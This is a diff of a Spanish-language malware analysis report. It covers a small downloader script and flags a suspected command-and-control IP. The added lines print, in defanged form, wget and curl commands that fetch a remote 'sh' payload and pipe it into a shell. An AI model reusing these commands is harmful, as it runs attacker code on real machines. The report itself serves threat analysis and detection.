@@ -4,7 +4,13 @@
 
 ## 📌 Resumen
 
-Artefacto identificado como ASCII text, with no line terminators de 121 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `sh` en `hxxps://217.60.195.XXX/sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+Texto ASCII de 121 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `sh` en `hxxps://217.60.195.XXX/sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**
+
+1. `wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh`
+2. `curl -sk hxxps://217.60.195.XXX/sh)`
+3. `sh -s apache.selfre` **C2 / infraestructura de control:**
+
+- **Posible C2:** `217.60.195.XXX` — confianza Alto, evidencia hardcoded_in_payload Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/72561b01f748cf7d8805f262fdc578df3720021ff7a13f0b59a48ff1bce81e2a.md](../../../../../malware-like/oraculo/downloader/72561b01f748cf7d8805f262fdc578df3720021ff7a13f0b59a48ff1bce81e2a.md)
 
 
 ## 🏷️ Clasificación
